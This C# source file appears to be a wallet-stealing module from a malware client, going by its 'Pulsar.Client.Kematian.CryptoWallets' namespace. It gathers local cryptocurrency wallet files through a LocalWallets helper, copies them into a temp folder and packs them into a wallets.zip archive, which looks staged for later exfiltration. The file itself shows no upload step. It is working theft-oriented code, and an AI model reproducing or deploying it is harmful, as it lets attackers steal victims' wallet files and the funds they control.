using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace Pulsar.Client.Kematian.CryptoWallets
{
    public class GetWallets
    {
        /// <summary>
        /// Gets a list of cryptocurrency wallets found on the system
        /// </summary>
        /// <returns>String with information about found wallets</returns>
        public static string Wallets()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== Cryptocurrency Wallet Information ===");
            sb.AppendLine();

            try
            {
                // Get local wallet files
                Dictionary<string, byte[]> localWalletFiles = LocalWallets.GetLocalWalletFiles();
                
                // Removed browser wallet functionality
                
                // Write summary information
                sb.AppendLine($"Local Wallets Found: {localWalletFiles.Count}");
                sb.AppendLine();
                
                // Create a temporary directory to save files
                string tempDir = Path.Combine(Path.GetTempPath(), "PulsarWallets_" + Guid.NewGuid().ToString().Substring(0, 8));
                Directory.CreateDirectory(tempDir);
                
                try
                {
                    // Save wallet files
                    foreach (var walletFile in localWalletFiles)
                    {
                        try
                        {
                            string filePath = Path.Combine(tempDir, walletFile.Key);
                            string directory = Path.GetDirectoryName(filePath);
                            
                            if (!Directory.Exists(directory))
                                Directory.CreateDirectory(directory);
                                
                            File.WriteAllBytes(filePath, walletFile.Value);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error saving wallet file {walletFile.Key}: {ex.Message}");
                        }
                    }
                    
                    // Create a zip file
                    string zipPath = Path.Combine(Path.GetTempPath(), "wallets.zip");
                    if (File.Exists(zipPath))
                        File.Delete(zipPath);
                        
                    if (localWalletFiles.Count > 0)
                    {
                        try
                        {
                            // Use built-in compression to create a zip file
                            System.IO.Compression.ZipFile.CreateFromDirectory(tempDir, zipPath);
                            
                            // Get file size
                            FileInfo zipInfo = new FileInfo(zipPath);
                            long fileSizeInBytes = zipInfo.Length;
                            double fileSizeInMB = Math.Round((double)fileSizeInBytes / (1024 * 1024), 2);
                            
                            sb.AppendLine($"Wallet Files Archive Size: {fileSizeInMB} MB");
                            sb.AppendLine($"Wallet Files Archive Path: {zipPath}");
                        }
                        catch (Exception ex)
                        {
                            sb.AppendLine($"Error creating wallet files archive: {ex.Message}");
                            Debug.WriteLine($"Error creating wallet files archive: {ex.Message}");
                        }
                    }
                    else
                    {
                        sb.AppendLine("No wallet files found to archive.");
                    }
                }
                catch (Exception ex)
                {
                    sb.AppendLine($"Error saving wallet files: {ex.Message}");
                    Debug.WriteLine($"Error saving wallet files: {ex.Message}");
                }
                finally
                {
                    // Clean up temp directory
                    try
                    {
                        if (Directory.Exists(tempDir))
                            Directory.Delete(tempDir, true);
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error retrieving wallet information: {ex.Message}");
                Debug.WriteLine($"Error in Wallets(): {ex.Message}");
            }
            
            return sb.ToString();
        }
    }
} 